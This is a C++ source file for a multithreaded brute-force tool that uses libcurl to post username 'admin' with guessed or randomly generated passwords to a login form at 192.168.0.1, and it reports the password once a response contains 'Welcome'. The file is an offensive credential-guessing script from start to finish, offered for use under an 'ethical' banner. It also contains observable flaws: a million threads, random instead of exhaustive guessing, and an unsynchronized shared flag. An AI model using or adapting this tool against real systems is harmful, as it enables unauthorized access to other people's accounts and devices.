#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <random>
#include <ctime>
#include <thread>
#include <mutex>
#include <atomic>
#include <sstream>
#include <iomanip>
#include <curl/curl.h>

struct Config {
    std::string baseURL;
    std::string passwordFile;
    int concurrency;
    int maxAttempts;
    int passwordLen;
    std::string charset;
    bool generate;
};

struct BruteForceState {
    bool found = false;
    int attempts = 0;
    std::string password;
    std::mutex lock;
};

std::vector<std::string> loadPasswords(const Config& config);
std::vector<std::string> generatePasswords(int length, int count, const std::string& charset);
std::string generateRandomPassword(int length, const std::string& charset);
bool attemptLogin(const std::string& url, const std::string& username, const std::string& password);
void worker(const Config& config, BruteForceState& state, const std::vector<std::string>& passwords);
void runBruteForce(const Config& config, BruteForceState& state);
void checkServer(const std::string& baseURL);
void displayIntro();

int main() {
    displayIntro();

    Config config{
        "http://192.168.0.1/",
        "passwords.txt",
        1000000,
        10000000,
        8,
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*",
        true
    };

    BruteForceState state;
    checkServer(config.baseURL);

    std::cout << "Starting brute force attack...\n";
    auto startTime = std::clock();
    runBruteForce(config, state);
    double duration = (std::clock() - startTime) / (double)CLOCKS_PER_SEC;

    if (state.found) {
        std::cout << "Password found! Username: admin\nPassword: " << state.password
                  << "\nAttempts: " << state.attempts << "\nTime taken: " << duration << "s\n";
    } else {
        std::cout << "No valid credentials found after " << state.attempts << " attempts.\n";
    }

    return 0;
}

std::vector<std::string> loadPasswords(const Config& config) {
    if (config.generate) {
        return generatePasswords(config.passwordLen, config.maxAttempts, config.charset);
    }

    std::ifstream file(config.passwordFile);
    if (!file) {
        std::cerr << "Error loading password file: " << config.passwordFile << std::endl;
        return {};
    }

    std::vector<std::string> passwords;
    std::string password;
    while (std::getline(file, password)) {
        passwords.push_back(password);
    }

    if (passwords.empty()) {
        std::cout << "Password file is empty, generating passwords...\n";
        return generatePasswords(config.passwordLen, config.maxAttempts, config.charset);
    }

    return passwords;
}

std::vector<std::string> generatePasswords(int length, int count, const std::string& charset) {
    std::vector<std::string> passwords;
    for (int i = 0; i < count; ++i) {
        passwords.push_back(generateRandomPassword(length, charset));
    }
    return passwords;
}

std::string generateRandomPassword(int length, const std::string& charset) {
    std::string password;
    std::random_device rd;
    std::mt19937 generator(rd());
    std::uniform_int_distribution<> dist(0, charset.size() - 1);

    for (int i = 0; i < length; ++i) {
        password += charset[dist(generator)];
    }
    return password;
}

size_t writeCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    s->append(static_cast<char*>(contents), size * nmemb);
    return size * nmemb;
}

bool attemptLogin(const std::string& url, const std::string& username, const std::string& password) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;

    std::string postFields = "username=" + username + "&password=" + password;
    std::string response;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        std::cerr << "Request error: " << curl_easy_strerror(res) << std::endl;
        return false;
    }

    return response.find("Welcome") != std::string::npos;
}

void worker(const Config& config, BruteForceState& state, const std::vector<std::string>& passwords) {
    for (const auto& password : passwords) {
        if (state.found || state.attempts >= config.maxAttempts) break;

        {
            std::lock_guard<std::mutex> lock(state.lock);
            ++state.attempts;
        }

        if (attemptLogin(config.baseURL, "admin", password)) {
            std::lock_guard<std::mutex> lock(state.lock);
            state.found = true;
            state.password = password;
            break;
        }
    }
}

void runBruteForce(const Config& config, BruteForceState& state) {
    auto passwords = loadPasswords(config);
    int totalPasswords = passwords.size();
    if (totalPasswords == 0) {
        std::cerr << "No passwords available for brute force.\n";
        return;
    }

    std::vector<std::thread> threads;
    int chunkSize = totalPasswords / config.concurrency;

    for (int i = 0; i < config.concurrency; ++i) {
        int start = i * chunkSize;
        int end = (i == config.concurrency - 1) ? totalPasswords : start + chunkSize;

        threads.emplace_back(worker, std::cref(config), std::ref(state),
                             std::vector<std::string>(passwords.begin() + start, passwords.begin() + end));
    }

    for (auto& thread : threads) {
        thread.join();
    }
}

void checkServer(const std::string& baseURL) {
    CURL* curl = curl_easy_init();
    if (!curl) return;

    curl_easy_setopt(curl, CURLOPT_URL, baseURL.c_str());
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res == CURLE_OK) {
        std::cout << "Server is up at " << baseURL << std::endl;
    } else {
        std::cerr << "Could not connect to server at " << baseURL << std::endl;
    }
}

void displayIntro() {
    std::string banner = R"(
██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗  ███████╗
██╔══██╗██╔═══╝ ██║   ██║   ██║   ██╔══╝  ╚════██║
██║  ██║██║     ╚██████╔╝   ██║   ███████╗███████║
╚═╝  ╚═╝╚═╝      ╚═════╝    ╚═╝   ╚══════╝╚══════╝
    --- Islamic Ethical Brute-force Tool ---
          Allah is watching. Stay Ethical.
)";
    std::cout << banner << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(1));
}
